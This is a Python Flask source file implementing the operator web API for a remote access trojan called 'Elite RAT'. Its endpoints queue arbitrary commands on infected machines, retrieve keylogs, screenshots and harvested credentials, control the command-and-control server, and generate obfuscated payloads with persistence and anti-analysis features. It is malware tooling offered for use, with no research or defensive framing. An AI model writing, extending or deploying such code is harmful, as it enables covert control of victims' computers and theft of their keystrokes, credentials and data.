#!/usr/bin/env python3
"""
Web API Implementation for Elite RAT
Complete REST API with all agent management endpoints
"""

from flask import Flask, Blueprint, request, jsonify, send_file, abort
from flask_cors import CORS
from functools import wraps
import jwt
import datetime
import hashlib
import os
import json
import base64
import io
from typing import Optional, Dict, List, Any

from Core.config_loader import config
from Core.logger import get_logger
from Core.database import db
from Core.c2_server import c2_server, start_c2_server, stop_c2_server
from Core.payload_generator import AdvancedPayloadGenerator

log = get_logger('webapp')

# Create API blueprint
api = Blueprint('api', __name__, url_prefix='/api')

# JWT secret
JWT_SECRET = config.get('webapp.secret_key', 'CHANGE_THIS_SECRET_KEY')

def require_auth(f):
    """Decorator to require authentication"""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None
        
        # Check for token in headers
        if 'Authorization' in request.headers:
            auth_header = request.headers['Authorization']
            try:
                token = auth_header.split(' ')[1]  # Bearer <token>
            except IndexError:
                return jsonify({'error': 'Invalid authorization header'}), 401
        
        if not token:
            return jsonify({'error': 'Authentication required'}), 401
        
        try:
            # Decode token
            payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
            request.user = payload.get('user')
            
            # Log API access
            db.audit_log(
                request.user,
                f"API:{request.endpoint}",
                request.remote_addr,
                json.dumps(dict(request.args))
            )
            
        except jwt.ExpiredSignatureError:
            return jsonify({'error': 'Token expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'error': 'Invalid token'}), 401
        
        return f(*args, **kwargs)
    
    return decorated

# Authentication endpoints
@api.route('/auth/login', methods=['POST'])
def login():
    """Authenticate user and return JWT token"""
    
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    # Verify credentials
    expected_user = config.get('webapp.admin_user', 'admin')
    expected_pass = config.get('webapp.admin_password', 'CHANGE_THIS_PASSWORD')
    
    if username != expected_user or password != expected_pass:
        log.warning(f"Failed login attempt for user {username} from {request.remote_addr}")
        return jsonify({'error': 'Invalid credentials'}), 401
    
    # Generate token
    token_payload = {
        'user': username,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24),
        'iat': datetime.datetime.utcnow()
    }
    
    token = jwt.encode(token_payload, JWT_SECRET, algorithm='HS256')
    
    log.info(f"User {username} logged in from {request.remote_addr}")
    
    return jsonify({
        'token': token,
        'user': username,
        'expires_in': 86400  # 24 hours
    })

@api.route('/auth/verify', methods=['GET'])
@require_auth
def verify_token():
    """Verify token is valid"""
    return jsonify({'valid': True, 'user': request.user})

# Agent management endpoints
@api.route('/agents', methods=['GET'])
@require_auth
def get_agents():
    """Get all agents"""
    
    active_only = request.args.get('active_only', 'false').lower() == 'true'
    
    # Get agents from database
    agents = db.get_all_agents(active_only=active_only)
    
    # Add connection status from C2 server
    if c2_server:
        connected_agents = c2_server.get_connected_agents()
        connected_ids = {a['agent_id'] for a in connected_agents if 'agent_id' in a}
        
        for agent in agents:
            agent['connected'] = agent['id'] in connected_ids
    else:
        for agent in agents:
            agent['connected'] = False
    
    return jsonify({
        'agents': agents,
        'total': len(agents),
        'connected': sum(1 for a in agents if a.get('connected', False))
    })

@api.route('/agents/<agent_id>', methods=['GET'])
@require_auth
def get_agent(agent_id):
    """Get specific agent details"""
    
    agent = db.get_agent(agent_id)
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    # Add connection status
    if c2_server:
        agent_info = c2_server.get_agent_info(agent_id)
        if agent_info:
            agent['connected'] = True
            agent['last_heartbeat'] = agent_info.get('last_heartbeat')
        else:
            agent['connected'] = False
    
    # Get recent results
    agent['recent_results'] = db.get_command_results(agent_id, limit=10)
    
    return jsonify(agent)

@api.route('/agents/<agent_id>/execute', methods=['POST'])
@require_auth
def execute_command(agent_id):
    """Execute command on agent"""
    
    data = request.get_json()
    command = data.get('command')
    priority = data.get('priority', 5)
    
    if not command:
        return jsonify({'error': 'Command required'}), 400
    
    # Check if agent exists
    agent = db.get_agent(agent_id)
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    # Queue command
    if c2_server:
        command_id = c2_server.queue_command(agent_id, command, priority)
    else:
        command_id = db.add_command(agent_id, command, priority)
    
    log.info(f"User {request.user} queued command {command_id} for agent {agent_id}")
    
    return jsonify({
        'command_id': command_id,
        'status': 'queued',
        'agent_id': agent_id,
        'command': command
    })

@api.route('/agents/<agent_id>/results', methods=['GET'])
@require_auth
def get_results(agent_id):
    """Get command results for agent"""
    
    limit = request.args.get('limit', 50, type=int)
    results = db.get_command_results(agent_id, limit=limit)
    
    return jsonify({
        'agent_id': agent_id,
        'results': results,
        'count': len(results)
    })

@api.route('/agents/<agent_id>/files', methods=['GET'])
@require_auth
def get_agent_files(agent_id):
    """Get files uploaded by agent"""
    
    # This would query files from database
    # For now, return empty
    return jsonify({
        'agent_id': agent_id,
        'files': [],
        'count': 0
    })

@api.route('/agents/<agent_id>/files', methods=['POST'])
@require_auth
def upload_file_to_agent(agent_id):
    """Upload file to agent"""
    
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    
    # Queue file download command
    # This would create a special command for file download
    
    return jsonify({
        'status': 'queued',
        'filename': file.filename
    })

@api.route('/agents/<agent_id>/screenshot', methods=['GET'])
@require_auth
def get_screenshot(agent_id):
    """Get latest screenshot from agent"""
    
    # Queue screenshot command
    if c2_server:
        command_id = c2_server.queue_command(agent_id, '__screenshot__', priority=8)
    else:
        command_id = db.add_command(agent_id, '__screenshot__', priority=8)
    
    return jsonify({
        'command_id': command_id,
        'status': 'queued'
    })

@api.route('/agents/<agent_id>/keylog', methods=['GET'])
@require_auth
def get_keylog(agent_id):
    """Get keylog data from agent"""
    
    limit = request.args.get('limit', 100, type=int)
    keylogs = db.get_keylogs(agent_id, limit=limit)
    
    return jsonify({
        'agent_id': agent_id,
        'keylogs': keylogs,
        'count': len(keylogs)
    })

@api.route('/agents/<agent_id>/terminate', methods=['POST'])
@require_auth
def terminate_agent(agent_id):
    """Terminate agent"""
    
    # Queue terminate command
    if c2_server:
        command_id = c2_server.queue_command(agent_id, '__terminate__', priority=10)
    else:
        command_id = db.add_command(agent_id, '__terminate__', priority=10)
    
    # Update agent status
    db.set_agent_status(agent_id, 'terminating')
    
    log.warning(f"User {request.user} terminated agent {agent_id}")
    
    return jsonify({
        'status': 'terminating',
        'command_id': command_id
    })

# Payload generation endpoints
@api.route('/payload/generate', methods=['POST'])
@require_auth
def generate_payload():
    """Generate new payload"""
    
    data = request.get_json()
    
    platform = data.get('platform', 'python')
    persistence = data.get('persistence', True)
    anti_analysis = data.get('anti_analysis', True)
    obfuscation = data.get('obfuscation', 3)
    custom_config = data.get('config', {})
    
    try:
        generator = AdvancedPayloadGenerator()
        generator.obfuscation_level = obfuscation
        
        # Generate payload
        code = generator.generate_agent(
            platform=platform,
            persistence=persistence,
            anti_analysis=anti_analysis,
            custom_config=custom_config
        )
        
        # Save payload
        filename = f"agent_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        filepath = generator.save_payload(code, filename)
        
        log.info(f"User {request.user} generated payload: {filename}")
        
        return jsonify({
            'filename': filename,
            'path': filepath,
            'size': len(code),
            'platform': platform,
            'features': {
                'persistence': persistence,
                'anti_analysis': anti_analysis,
                'obfuscation': obfuscation
            }
        })
        
    except Exception as e:
        log.error(f"Payload generation failed: {e}")
        return jsonify({'error': str(e)}), 500

@api.route('/payload/download/<filename>', methods=['GET'])
@require_auth
def download_payload(filename):
    """Download generated payload"""
    
    # Sanitize filename
    filename = os.path.basename(filename)
    filepath = os.path.join(config.get('payload.output_dir', '/workspace/generated/'), filename)
    
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    
    return send_file(filepath, as_attachment=True, download_name=filename)

# C2 server management endpoints
@api.route('/c2/status', methods=['GET'])
@require_auth
def c2_status():
    """Get C2 server status"""
    
    if c2_server:
        status = {
            'running': c2_server.running,
            'host': c2_server.host,
            'port': c2_server.port,
            'ssl_enabled': c2_server.ssl_context is not None,
            'connected_agents': len(c2_server.get_connected_agents()),
            'agents': c2_server.get_connected_agents()
        }
    else:
        status = {
            'running': False,
            'host': config.c2_host,
            'port': config.c2_port,
            'ssl_enabled': config.get('c2.ssl_enabled', False),
            'connected_agents': 0,
            'agents': []
        }
    
    return jsonify(status)

@api.route('/c2/start', methods=['POST'])
@require_auth
def start_c2():
    """Start C2 server"""
    
    if start_c2_server():
        log.info(f"User {request.user} started C2 server")
        return jsonify({'status': 'started'})
    else:
        return jsonify({'error': 'C2 server already running'}), 400

@api.route('/c2/stop', methods=['POST'])
@require_auth
def stop_c2():
    """Stop C2 server"""
    
    stop_c2_server()
    log.info(f"User {request.user} stopped C2 server")
    return jsonify({'status': 'stopped'})

# Statistics endpoints
@api.route('/stats', methods=['GET'])
@require_auth
def get_statistics():
    """Get system statistics"""
    
    stats = db.get_statistics()
    
    # Add C2 stats
    if c2_server:
        stats['c2_running'] = c2_server.running
        stats['connected_agents'] = len(c2_server.get_connected_agents())
    else:
        stats['c2_running'] = False
        stats['connected_agents'] = 0
    
    return jsonify(stats)

# Credential management
@api.route('/credentials', methods=['GET'])
@require_auth
def get_credentials():
    """Get all harvested credentials"""
    
    agent_id = request.args.get('agent_id')
    creds = db.get_credentials(agent_id=agent_id)
    
    return jsonify({
        'credentials': creds,
        'count': len(creds)
    })

# Create Flask app with API
def create_app():
    """Create Flask application with API"""
    
    app = Flask(__name__)
    CORS(app)
    
    # Register API blueprint
    app.register_blueprint(api)
    
    # Health check endpoint
    @app.route('/health')
    def health():
        return jsonify({'status': 'healthy'})
    
    # Root endpoint
    @app.route('/')
    def index():
        return jsonify({
            'name': 'Elite RAT API',
            'version': '1.0.0',
            'endpoints': [
                '/api/auth/login',
                '/api/agents',
                '/api/agents/<id>',
                '/api/agents/<id>/execute',
                '/api/agents/<id>/results',
                '/api/payload/generate',
                '/api/c2/status',
                '/api/stats'
            ]
        })
    
    return app

# Test the API
if __name__ == "__main__":
    import sys
    sys.path.insert(0, '/workspace')
    
    print("Testing Web API")
    print("-" * 50)
    
    app = create_app()
    
    # Test client
    with app.test_client() as client:
        # Test health endpoint
        response = client.get('/health')
        assert response.status_code == 200
        print("✅ Health endpoint working")
        
        # Test login
        response = client.post('/api/auth/login', 
                              json={'username': 'admin', 
                                   'password': config.get('webapp.admin_password')})
        
        if response.status_code == 200:
            token = response.json['token']
            print(f"✅ Login successful, got token")
            
            # Test authenticated endpoint
            headers = {'Authorization': f'Bearer {token}'}
            response = client.get('/api/agents', headers=headers)
            assert response.status_code == 200
            print(f"✅ Agents endpoint working: {response.json['total']} agents")
            
            # Test C2 status
            response = client.get('/api/c2/status', headers=headers)
            assert response.status_code == 200
            print(f"✅ C2 status endpoint working")
            
            # Test stats
            response = client.get('/api/stats', headers=headers)
            assert response.status_code == 200
            print(f"✅ Statistics endpoint working")
        else:
            print("❌ Login failed - check password configuration")
    
    print("\n✅ Web API working correctly!")